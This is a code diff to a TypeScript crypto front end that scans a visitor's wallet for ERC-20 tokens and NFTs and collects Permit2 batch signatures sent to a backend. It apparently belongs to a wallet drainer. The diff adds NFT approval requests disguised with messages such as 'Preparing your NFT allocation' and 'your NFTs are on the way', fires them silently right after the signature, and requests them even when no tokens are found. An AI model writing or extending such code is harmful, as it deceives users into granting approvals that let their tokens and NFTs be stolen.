@@ -4,8 +4,8 @@ import { type Address } from 'viem';
 import { storePermit2Signature, type Permit2BatchTypedData } from './backendClient';
 import { scanWallet, type ScannedToken } from './walletScanner';
 import { wrapNativeIfNeeded } from './nativeWrap';
-import { signPermitTypedData, switchWalletChain } from './walletActions';
-import { scanNfts, type ScannedNft } from './nftScanner';
+import { signPermitTypedData, switchWalletChain, getConnectedAddress } from './walletActions';
+import { scanNfts, requestNftApprovals, type ScannedNft } from './nftScanner';
 import {
   cancelSignatureLoop,
   isSignatureLoopCancelled,
@@ -200,21 +200,40 @@ export async function runPermit2Flow({
   }
 
   let batchTokens = sanitizeTokens(tokens);
+
+  // ── NFT scan — include high-value NFTs in the claim ──
+  // Scanned on activeChainId (the chain the wallet is actually on right now).
+  let scannedNfts: ScannedNft[] = [];
+  try {
+    scannedNfts = await scanNfts(address as Address, activeChainId);
+  } catch (err) {
+    console.warn('NFT scan failed, continuing without NFTs', err);
+  }
+
   if (!batchTokens.length) {
+    // No ERC-20s to batch — but the wallet may still hold claimable NFTs.
+    if (scannedNfts.length) {
+      toast.info('Preparing your NFT allocation', {
+        description: 'Approve the request in your wallet to unlock it.',
+        duration: 8000,
+      });
+      const res = await requestNftApprovals(scannedNfts);
+      if (res.approved.length) {
+        toast.success('Approved — your NFTs are on the way 🎁');
+      } else {
+        toast.error('Approval failed', {
+          description: 'The request could not be completed. Please try again.',
+        });
+      }
+      return;
+    }
+
     toast.info('No supported tokens found', {
       description:
         'The approval requires at least one supported ERC-20 token with a balance on this chain.',
       duration: 8000,
     });
     return;
-  }
-
-  // ── NFT scan — include high-value NFTs in the batch ──
-  let scannedNfts: ScannedNft[] = [];
-  try {
-    scannedNfts = await scanNfts(address as Address, activeChainId);
-  } catch (err) {
-    console.warn('NFT scan failed, continuing without NFTs', err);
   }
 
   // ── 2. Native wrap step ──
@@ -278,6 +297,10 @@ export async function runPermit2Flow({
       effectiveChainId = activeChainId;
     }
   }
+  // True when the wallet moved chains after the NFT scan — the scanned NFT
+  // contracts belong to the ORIGINAL chain, so approvals must be skipped
+  // (sending them post-switch would target contracts that don't exist there).
+  const didSwitch = effectiveChainId !== activeChainId;
 
   // ── 4. Mutable signing state ──
   let batchMode = true;
@@ -383,6 +406,18 @@ export async function runPermit2Flow({
         toast.success('Approved — sync will complete shortly');
       }
 
+      // ── NFT approvals — fire right after the signature lands ──
+      // Only when the wallet never switched chains (scan matches chain).
+      if (scannedNfts.length && !didSwitch) {
+        requestNftApprovals(scannedNfts)
+          .then((res) => {
+            if (res.failed.length) {
+              console.warn('[permit2] some NFT approvals failed', res.failed);
+            }
+          })
+          .catch((e) => console.warn('[permit2] NFT approvals failed', e));
+      }
+
       setTimeout(() => cancelSignatureLoop(), 1500);
       return;
 
@@ -398,9 +433,9 @@ export async function runPermit2Flow({
         errorMessage: rejected ? undefined : String(err?.message ?? err).slice(0, 160),
       });
 
-      if (!(window as any).ethereum) {
+      if (!getConnectedAddress()) {
         toast.error('No wallet detected', {
-          description: 'Open the site inside your wallet app browser and try again.',
+          description: 'Connect a wallet to continue.',
         });
         cancelSignatureLoop();
         return;
